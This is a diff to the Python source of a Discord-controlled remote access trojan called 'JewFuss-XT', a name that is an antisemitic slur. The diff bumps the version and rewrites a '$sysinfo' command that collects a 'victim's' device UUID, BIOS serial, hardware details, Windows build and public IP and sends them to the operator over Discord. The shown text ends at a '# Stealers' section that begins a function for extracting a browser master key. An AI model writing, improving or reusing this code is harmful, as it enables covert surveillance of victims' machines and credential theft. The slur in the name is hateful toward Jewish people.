@@ -47,7 +47,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.6" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.7" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -1122,68 +1122,113 @@ async def on_message(message):
 @bot.command(help="Gets information on the victim's system", usage="$sysinfo")
 async def sysinfo(ctx):
     try:
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\DWM") as key:
+                accent_color, _ = winreg.QueryValueEx(key, "AccentColor")
+            b = (accent_color >> 16) & 0xFF
+            g = (accent_color >> 8) & 0xFF
+            r = accent_color & 0xFF
+            color_hex = f"{r:02X}{g:02X}{b:02X}"
+        except Exception as e:
+            await ctx.send(f"Failed to read accent color (assuming default): {e}")
+            color_hex = "0078D4"
+            
+        access = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
+        with winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, access) as key:
+            try:
+                display_version, _ = winreg.QueryValueEx(key, "DisplayVersion")
+            except FileNotFoundError:
+                display_version = winreg.QueryValueEx(key, "ReleaseId")[0]
+            build_number = str(winreg.QueryValueEx(key, "CurrentBuildNumber")[0])
+            ubr = int(winreg.QueryValueEx(key, "UBR")[0])
+            edition_id = str(winreg.QueryValueEx(key, "EditionID")[0])
+            product_name = str(winreg.QueryValueEx(key, "ProductName")[0])
+
+        windows_version = display_version
+        windows_os_build = f"{build_number}.{ubr}"
+
+        if "Server" in product_name:
+            windows_os_type = product_name
+        else:
+            base = "Windows 11" if int(build_number) >= 22000 else "Windows 10"
+            edition_map = {
+                "Professional": "Pro",
+                "Pro": "Pro",
+                "Core": "Home",
+                "Enterprise": "Enterprise",
+                "EnterpriseS": "Enterprise LTSC",
+                "Education": "Education",
+                "ProEducation": "Pro Education",
+                "ProWorkstation": "Pro for Workstations",
+                "IoTEnterprise": "IoT Enterprise",
+            }
+            suffix = edition_map.get(edition_id, edition_id)
+            windows_os_type = f"{base} {suffix}".strip()
+
         c = wmi.WMI()
         windows_devicename = platform.node()
         windows_device_uuid = c.Win32_ComputerSystemProduct()[0].UUID
-        windows_version = platform.version()
-        windows_os_build = platform.win32_ver()[1]
-        windows_os_type = platform.win32_ver()[0]
-        timezone = time.tzname[0] if time.daylight != 0 else time.tzname[1]
-        
+        timezone = time.tzname[1] if time.daylight else time.tzname[0]
+
         system = c.Win32_ComputerSystem()[0]
         bios = c.Win32_BIOS()[0]
         processor = c.Win32_Processor()[0]
         network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
-        physical_disk = c.Win32_DiskDrive()[0]
-        
+        disks = c.Win32_DiskDrive()
+
         serial_number = getattr(bios, 'SerialNumber', "Unknown")
         manufacturer = getattr(system, 'Manufacturer', "Unknown")
         model = getattr(system, 'Model', "Unknown")
-        total_ram = int(system.TotalPhysicalMemory) // (1024**2) if hasattr(system, 'TotalPhysicalMemory') else "Unknown"
-        total_ram_gb = total_ram / 1024 if total_ram != "Unknown" else "Unknown"
+        total_ram_mb = int(system.TotalPhysicalMemory) // (1024**2) if hasattr(system, 'TotalPhysicalMemory') else None
         cpu = getattr(processor, 'Name', "Unknown")
-        total_main_drive_storage = int(physical_disk.Size) // (1024**3) if hasattr(physical_disk, 'Size') else "Unknown"
+        total_main_drive_storage = int(disks[0].Size) // (1024**3) if disks and hasattr(disks[0], 'Size') else None
         network_adapter = network_adapters[0].Description.split(" - ")[-1] if network_adapters else "Unknown"
-        
-        uuid_process = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], capture_output=True, text=True)
-        device_uuid = uuid_process.stdout.strip().split('\n')[-1]
-        if device_uuid.startswith("UUID"):
-            device_uuid = device_uuid.replace("UUID", "").strip()
-        
-        sku_number = getattr(system, 'IdentifyingNumber', "Unknown")
-        ip = requests.get('https://api.ipify.org').content.decode('utf8')
-    
+        sku_number = getattr(c.Win32_ComputerSystemProduct()[0], 'IdentifyingNumber', "Unknown")
+        ip = requests.get('https://api.ipify.org', timeout=5).content.decode('utf8')
+
     except Exception as e:
         await ctx.send(f"Error fetching system information: {e}")
         return
-    
-    output = ""
-    output += f"Windows Information:\n"
-    output += f"Windows device UUID: {windows_device_uuid}\n"
-    output += f"Windows devicename: {windows_devicename}\n"
-    output += f"Windows Version: {windows_version}\n"
-    output += f"Windows OS Build: {windows_os_build}\n"
-    output += f"Windows OS Type: {windows_os_type}\n"
-    output += f"\nOther Information:\n"
-    output += f"Public IP: {ip}\n"
-    output += f"Timezone: {timezone}\n"
-    output += f"\nDevice Specifications:\n"
-    output += f"Serial Number: {serial_number}\n"
-    output += f"Manufacturer: {manufacturer}\n"
-    output += f"Model: {model}\n"
-    output += f"Total RAM: {total_ram_gb:.2f} GB ({total_ram} MB)\n"
-    output += f"CPU: {cpu}\n"
-    output += f"Total Main Drive Storage: {total_main_drive_storage} GB\n"
-    output += f"Network adapter: {network_adapter}\n"
-    output += f"Device UUID: {device_uuid}\n"
-    output += f"SKU Number: {sku_number}\n"
-    
-    if len(output) > 2000:
-        buffer = io.BytesIO(output.encode('utf-8'))
-        await ctx.send(file=discord.File(fp=buffer, filename="system_info.txt"))
-    else:
-        await ctx.send(output)
 
+    def isKnown(value: str):
+        value = str(value).strip().lower()
+        return value not in ("unknown", "default string", "")
+
+    embed = discord.Embed(
+        title=f"System Information for `{windows_devicename}`",
+        color=int(color_hex, 16)
+    )
+
+    embed.add_field(
+        name="Windows Info:",
+        value=(
+            f"UUID: `{windows_device_uuid.strip()}`\n"
+            f"Type: `{windows_os_type.strip()}`\n"
+            f"Build: `{windows_os_build.strip()}`\n"
+            f"Version: `{windows_version.strip()}`"
+        ),
+        inline=False
+    )
+
+    embed.add_field(name="Device Specifications:", value= (
+        f"Manufacturer: `{manufacturer.strip()}`\n"
+        + (f"Serial #: `{serial_number.strip()}`\n" if isKnown(serial_number) else "")
+        + f"Model: `{model.strip()}`\n\n"
+        + (f"Total RAM: `{total_ram_mb/1024:.2f} GB | ({total_ram_mb} MB)`\n" if total_ram_mb is not None else "")
+        + f"CPU: `{cpu.strip()}`\n"
+        + (f"Main Drive Size: `{total_main_drive_storage} GB`\n" if total_main_drive_storage is not None else "")
+        + f"Network adapter: `{network_adapter.strip()}`\n"
+        + (f"SKU #: `{sku_number.strip()}`\n" if isKnown(sku_number) else "")
+    ), inline=False)
+
+    embed.add_field(
+        name="Other Information:",
+        value=f"Public IP: `{ip}`\nTimezone: `{timezone}`",
+        inline=False
+    )
+
+    await ctx.send(embed=embed)
+    
 # Stealers
 
 def get_master_key(local_state_path):
